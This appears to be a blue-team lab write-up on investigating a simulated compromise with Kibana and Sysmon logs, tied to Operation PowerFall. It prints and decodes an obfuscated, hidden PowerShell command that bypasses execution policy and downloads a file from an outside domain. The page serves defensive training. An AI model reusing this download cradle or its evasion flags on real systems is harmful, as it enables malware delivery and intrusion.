<!DOCTYPE html>
<html><head><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.4.6/mermaid.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}});</script><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/latest.js?config=TeX-MML-AM_CHTML"></script><link rel="stylesheet" href="static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><link rel="stylesheet" href="static/light.css"/></head><body>
<a href="../boxesfolder.html" style="padding: 5px; color: black; position: absolute;">BACK</a><br>
<img src="images/crazyeights.png" style="display: block; padding: 5px 0px; width: 50%; margin: auto; margin-top: 5px;">
<h2>Find the bad - powerfall-convo</h2>
<h6>OCT 20</h6>
<ul>
<li>log analysis/blue team focused lab</li>
<li>introductory lab for doing log analysis with Kibana</li>
</ul>
<h4>Link:</h4>
<pre><code>https://github.com/findthebad/powerfall-convo
</code></pre>
<h3>Prereqs:</h3>
<pre><code>sudo apt-get install docker
sudo apt-get install docker-compose
</code></pre>
<h3>Setup:</h3>
<pre><code>git clone https://github.com/findthebad/powerfall-convo
cd powerfall-convo
docker-compose up
</code></pre>
<ul>
<li>Go to localhost:5601 to access the Kibana instance.</li>
</ul>
<h4>Lab questions:</h4>
<ul>
<li>What is the name of the malicious file that has executed?</li>
<li>What strain of malware does it appear to be?</li>
<li>What does this malware typically do?</li>
<li>When was this malware run and by which user on what computer? (Hint: Try pinning a Dashboard filter and viewing it in Discover)</li>
<li>What process wrote the malicious file to disk and when?</li>
</ul>
<p>This lab continues with the use of Kibana for identifying and investigating signs of a compromise (see Model 3). The VT Hunting dashboard has been updated with some new visualizations that should provide you the information you need to get started.</p>
<h4>Starting the lab:</h4>
<pre><code>crazyeights@es-base:~/Documents/powerfall-convo$ sudo docker-compose up
</code></pre>
<h4>Accessing Kibana:</h4>
<pre><code>http://localhost:5601
</code></pre>
<h4>Lab Questions:</h4>
<ol>
<li>What malicious domain has a process attempted to communicate with?</li>
<li>What were the command line arguments of the process that initiated the communication (Hint: There may be multiple processes, but only one that was &quot;user&quot; initiated)?</li>
<li>What do the arguments do? Can you decode all of them?</li>
<li>Does it appear the command was successful? Why or why not?</li>
<li>When did this process activity start, end, and who was the user on what computer?</li>
</ol>
<p>Bonus: What advanced persistent threat (APT) has been discussed as being the potential group behind this domain?</p>
<h4>1. What malicious domain has a process attempted to communicate with?</h4>
<ul>
<li><code>www.static-cdn1.com</code></li>
<li>On VirusTotal:</li>
<li><img src="images/pf2.png" style="width: 80%"></li>
<li>Looked for malicious/suspicious entries using:</li>
</ul>
<pre><code>winlog.event_data.Detections.Hashes.VirusTotal.malicious = 1
or
winlog.event_data.Detections.Hashes.VirusTotal.suspicious = 1
</code></pre>
<ul>
<li>Found this:</li>
</ul>
<pre><code>Dns query:
RuleName: -
UtcTime: 2020-09-05 17:35:07.261
ProcessGuid: {020ea625-cc4a-5f53-4a01-000000000500}
ProcessId: 8088
QueryName: www.static-cdn1.com
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
</code></pre>
<ul>
<li>Then looked at the surronding entries found the source:</li>
</ul>
<pre><code>	
Process Create:
RuleName: -
UtcTime: 2020-09-05 17:35:06.271
ProcessGuid: {020ea625-cc4a-5f53-4a01-000000000500}
ProcessId: 8088
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -WindowStyle hidden -NoExit -ep bypass -nop -encodedCommand //4oAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBzAHQAYQB0AGkAYwAtAGMAZABuADEALgBjAG8AbQAvAHUAcABkAGEAdABlAC4AegBpAHAAIgAsACAAIgBDADoAXABVAHMAZQByAHMAXABsAGEAYgAtAGEAZABtAGkAbgBcAEQAZQBzAGsAdABvAHAAXAB1AHAAZABhAHQAZQAuAHoAaQBwACIAKQA=
CurrentDirectory: C:\Users\lab-admin\
User: 22ec4e4c-wsw10\lab-admin
LogonGuid: {020ea625-cc22-5f53-ca23-0d0000000000}
LogonId: 0xD23CA
TerminalSessionId: 2
IntegrityLevel: High
Hashes: MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
ParentProcessGuid: {020ea625-cc46-5f53-4601-000000000500}
ParentProcessId: 4916
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &quot;C:\windows\system32\cmd.exe&quot; 
</code></pre>
<h4>2. What were the command line arguments of the process that initiated the communication (Hint: There may be multiple processes, but only one that was &quot;user&quot; initiated)?</h4>
<pre><code><span style="margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">powershell.exe  -WindowStyle hidden -NoExit -ep bypass -nop -encodedCommand //4oAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBzAHQAYQB0AGkAYwAtAGMAZABuADEALgBjAG8AbQAvAHUAcABkAGEAdABlAC4AegBpAHAAIgAsACAAIgBDADoAXABVAHMAZQByAHMAXABsAGEAYgAtAGEAZABtAGkAbgBcAEQAZQBzAGsAdABvAHAAXAB1AHAAZABhAHQAZQAuAHoAaQBwACIAKQA=</span>
</code></pre>
<ul>
<li>
<p>Goal: Obfuscation and evasion</p>
</li>
<li>
<p>Called from cmd.exe</p>
</li>
<li>
<p><code>-ep bypass</code> - bypass execution policy</p>
</li>
<li>
<p>WindowStyle hidden - Used to prevent PowerShell from displaying a window when it executes code.</p>
</li>
<li>
<p>nop - Prevents PowerShell from loading profile scripts, which get executed on launch, so as to avoid potentially unwanted commands or settings.</p>
</li>
<li>
<p>EncodedCommand - Accepts a base64-encoded string version of a command. Use this parameter
to submit commands to Windows PowerShell that require complex quotation
marks or curly braces.</p>
</li>
</ul>
<h4>3. What do the arguments do? Can you decode all of them?</h4>
<ul>
<li>From b64:</li>
</ul>
<pre><code><span style="margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">ÿþ(.N.e.w.-.O.b.j.e.c.t. .S.y.s.t.e.m...N.e.t...W.e.b.C.l.i.e.n.t.)...D.o.w.n.l.o.a.d.F.i.l.e.(.&quot;.h.t.t.p.s.:././.w.w.w...s.t.a.t.i.c.-.c.d.n.1...c.o.m./.u.p.d.a.t.e...z.i.p.&quot;.,. .&quot;.C.:.\.U.s.e.r.s.\.l.a.b.-.a.d.m.i.n.\.D.e.s.k.t.o.p.\.u.p.d.a.t.e...z.i.p.&quot;.).</span>
</code></pre>
<ul>
<li>Fix encoding:</li>
</ul>
<pre><code><span style="margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">(New-Object System.Net.WebClient).DownloadFile(&quot;https://www.static-cdn1.com/update.zip&quot;, &quot;C:\Users\lab-admin\Desktop\update.zip&quot;)
</span></code></pre>
<p>CyberChef Recipe:</p>
<img src="images/pf3.png" style="width: 80%">
<h4>4. Does it appear the command was successful? Why or why not?</h4>
<ul>
<li>No</li>
<li>QueryStatus: 9003 - 'DNS name does not exist', indicated connectivity issues or firewall</li>
</ul>
<h4>5. When did this process activity start, end, and who was the user on what computer?</h4>
<pre><code>User: 22ec4e4c-wsw10\lab-admin
Time period: Sep 5, 2020 @ 13:35:06.294 - Sep 5, 2020 @ 13:35:09.066
</code></pre>
<h4>Bonus:</h4>
<ul>
<li>
<p>Real-life: Operation PowerFall – Threat Actor Leverages Internet Explorer and Windows 10 Zero-Days</p>
</li>
<li>
<p>the attackers used a previously unknown full chain that consisted of two zero-day exploits: a remote code execution for Internet Explorer and a privilege escalation exploit for Windows. Researchers were then able to analyze the zero-days further and discovered that the new full chain targeted the latest builds of Windows 10 (build 18262 x64) and Internet Explorer 11. The two exploits are known as CVE-2020-0986 and CVE-2020-1380, respectively.</p>
</li>
<li>
<p>APT DarkHotel</p>
</li>
</ul>
<p>Finding the Internet Explorer part of the attack:</p>
<ul>
<li>Filtered by image:</li>
</ul>
<pre><code>timestamp: 	Sep 5, 2020 @ 13:35:29.382
Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-09-05 17:35:29.379
ProcessGuid: {020ea625-cc2c-5f53-1d01-000000000500}
ProcessId: 5696
Image: C:\windows\Explorer.EXE
TargetObject: HKU\S-1-5-21-4239719670-1178245662-2409435206-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{A9249952-F4C6-4BCD-9B44-6A5BA9B5209E} {7F9185B0-CB92-43C5-80A9-92277A4F7B54} 0xFFFF
Details: Binary Data
</code></pre>
</body></html>
